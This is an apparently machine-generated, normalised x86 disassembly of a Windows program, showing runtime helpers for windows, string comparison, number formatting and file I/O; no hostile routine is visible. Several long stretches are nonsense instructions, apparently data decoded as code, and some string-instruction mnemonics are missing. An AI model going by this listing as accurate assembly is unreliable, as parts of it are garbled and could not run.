mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_40297c
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406ae0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406bd5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406bfd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406c04
retn
sub_406c10
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406c35
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406c3c
retn
sub_406c48
push 0xf0004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add cl dh
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add dl dh
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add bl dh
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add ah dh
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add ch dh
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add dh dh
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add bh dh
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add al bh
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add cl bh
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add dl bh
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add bl bh
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add ah bh
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add ch bh
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add dh bh
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add bh bh
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add al ah
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add cl ah
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add dl ah
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add bl ah
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add ah ah
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add ch ah
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add dh ah
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add bh ah
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add al ch
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add cl ch
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add dl ch
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add bl ch
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add ah ch
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add ch ch
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add dh ch
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add bh ch
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add al dl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add cl dl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add dl dl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add bl dl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add ah dl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add ch dl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add dh dl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add bh dl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add al bl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add cl bl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add dl bl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add bl bl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add ah bl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add ch bl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add dh bl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add bh bl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add al al
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add cl al
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add dl al
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add bl al
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add ah al
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add ch al
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add dh al
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add bh al
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add al cl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add cl cl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add dl cl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add bl cl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add ah cl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add ch cl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add dh cl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add bh cl
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ eax + 0x680000ff ] dh
push ss
inc esi
add [ ecx + 0x680000ff ] dh
push ss
inc esi
add [ edx + 0x680000ff ] dh
push ss
inc esi
add [ ebx + 0x680000ff ] dh
push ss
inc esi
add [ edi + edi * 8 + 0x16680000 ] dh
inc esi
add [ ebp + 0x680000ff ] dh
push ss
inc esi
add [ esi + 0x680000ff ] dh
push ss
inc esi
add [ edi + 0x680000ff ] dh
push ss
inc esi
add [ eax + 0x680000ff ] bh
push ss
inc esi
add [ ecx + 0x680000ff ] bh
push ss
inc esi
add [ edx + 0x680000ff ] bh
push ss
inc esi
add [ ebx + 0x680000ff ] bh
push ss
inc esi
add [ edi + edi * 8 + 0x16680000 ] bh
inc esi
add [ ebp + 0x680000ff ] bh
push ss
inc esi
add [ esi + 0x680000ff ] bh
push ss
inc esi
add [ edi + 0x680000ff ] bh
push ss
inc esi
add [ eax + 0x680000ff ] ah
push ss
inc esi
add [ ecx + 0x680000ff ] ah
push ss
inc esi
add [ edx + 0x680000ff ] ah
push ss
inc esi
add [ ebx + 0x680000ff ] ah
push ss
inc esi
add [ edi + edi * 8 + 0x16680000 ] ah
inc esi
add [ ebp + 0x680000ff ] ah
push ss
inc esi
add [ esi + 0x680000ff ] ah
push ss
inc esi
add [ edi + 0x680000ff ] ah
push ss
inc esi
add [ eax + 0x680000ff ] ch
push ss
inc esi
add [ ecx + 0x680000ff ] ch
push ss
inc esi
add [ edx + 0x550000ff ] ch
mov ebp esp
xor eax eax
push ebp
push sub_406f45
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406f4c
retn
sub_407a44
and eax 0x2f00407a
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] bh
jpe r-xdata
je r-xdata
add [ eax ] dh
add [ eax ] al
add [ edx + edx ] cl
inc eax
add [ ebx + esi + 0x57dc0040 ] dl
inc eax
add al ch
push edi
inc eax
add [ eax - 0x63ffbfcd ] ch
xor eax [ eax ]
clc
push edi
inc eax
add [ eax ] bl
xor [ eax ] eax
add bl cl
inc eax
add [ esp + edx * 2 ] ah
dec ebp
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0xd00407a ] al
jpe r-xdata
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x1d00407a ] dl
jpe r-xdata
xor al 0x91
inc ebp
add [ ebx + 0x34158910 ] cl
xchg ecx eax
inc ebp
arpl [ eax + 0x72 ] bp
outsd
stosd [ edi ]
push edx
popad
inc ebp
js r-xdata
add ah cl
jpe r-xdata
add [ ecx ] al
add [ eax ] al
add [ edx - 0x74 ] dl
adc [ ebx - 0x71 ] bh
sbb eax 0xdf9c4cdb
push edi
loopne r-xdata
insb
jne r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407a443f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
retn
jns r-xdata
imul esi [ esi + 0x65 ] 0x74697257
push ebx
add [ ebx + 0x46014815 ] cl
add [ ebx + 0xa890448 ] cl
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_402754
call ebx
pop ebx
retn
adc [ ecx + 0x45913415 ] cl
outsb
imul edi [ edx + 0x65 ] r-xdata
sub_407af4
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407b10
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b51c
call sub_4038d8
pop edi
pop esi
pop ebx
retn
sub_407b34
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_402734
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402b78
mov eax esi
pop esi
pop ebx
retn
sub_407b54
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_402754
call ebx
pop ebx
retn
sub_407b80
push ebx
mov ebx eax
mov eax 0xc
call sub_402734
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_407b54
pop ebx
retn
sub_407bb8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40415c
mov ebx eax
mov eax edi
mov edx ebx
call sub_4044e8
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407bf4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40415c
mov ebx eax
mov eax edi
mov edx ebx
call sub_4044e8
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407c30
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407c60
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407c80
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_407cd4
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407c80
test eax eax
jne r-xdata
sub_407cf8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40415c
push eax
mov eax esi
call sub_40435c
push eax
mov eax ebx
call sub_40415c
push eax
mov eax ebx
call sub_40435c
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407d30
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40415c
push eax
mov eax esi
call sub_40435c
push eax
mov eax ebx
call sub_40415c
push eax
mov eax ebx
call sub_40435c
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407d80
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_407da0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_40415c
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_403e9c
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_4043bc
pop ebp
pop edi
pop esi
pop ebx
retn
sub_407df0
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_40415c
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_40415c
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_407e54
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_407e6a
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_407e6a
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407e6a
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407ea0
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_407e54
mov edx esi
pop eax
call sub_403f8c
add esp 0x10
pop esi
retn
sub_407ec0
or cl cl
jne sub_407ef4
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_407ef4
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_407ef4
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_407ef4
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407f8c
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_407ec0
mov edx esi
pop eax
call sub_403f8c
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_407fb4
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_407e54
mov edx esi
pop eax
call sub_403f8c
add esp 0x20
pop esi
retn
xor edx edx
sub_407fdc
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402b98
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407b10
sub_408030
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402b98
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408050
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_404cb8
mov [ esi ] eax
mov [ esi + 0x4 ] edx
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408070
mov eax [ rw-data ]
call sub_404ee8
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_404ee8
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4050a4
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403ef0
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4050a4
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403ef0
sub_408100
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_407d68
test al al
je r-xdata
sub_40813c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4092fc
mov edx eax
test dl dl
je r-xdata
call sub_408070
push ebp
mov eax [ rw-data ]
call sub_404ef0
mov edx eax
mov eax [ rw-data ]
call sub_408100
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_404ef0
mov edx eax
mov eax [ rw-data ]
call sub_408100
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_4081d8
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403ef0
call sub_408070
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403ef0
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403ef0
jmp r-xdata
pop esi
pop ebx
retn
sub_408224
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_40435c
push eax
call CreateFileA
sub_40827c
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_40435c
push eax
call CreateFileA
pop ebx
retn
sub_4082a8
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4082d4
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408300
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_408340
push ebx
push esi
mov esi eax
mov eax esi
call sub_40415c
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40be20
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_408370
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_40415c
mov edi eax
mov eax ebx
call sub_40435c
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_40862c
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40be20
cmp al 0x2
jne r-xdata
dec edi
sub_4083c0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_408370
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_4043bc
pop edi
pop esi
pop ebx
retn
sub_4083f8
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_40435c
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_403f8c
add esp 0x108
pop esi
pop ebx
retn
sub_408434
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404c94
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404c94
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_4084e4
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_40850c
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_408540
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_40415c
push eax
mov eax ebx
call sub_40435c
mov edx eax
mov eax esi
pop ecx
call sub_40850c
pop esi
pop ebx
retn
sub_408564
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_40435c
mov edx eax
mov ecx edi
mov eax ebx
call sub_40850c
pop edi
pop esi
pop ebx
retn
sub_408584
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_4085a8
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_4085e8
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408640
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
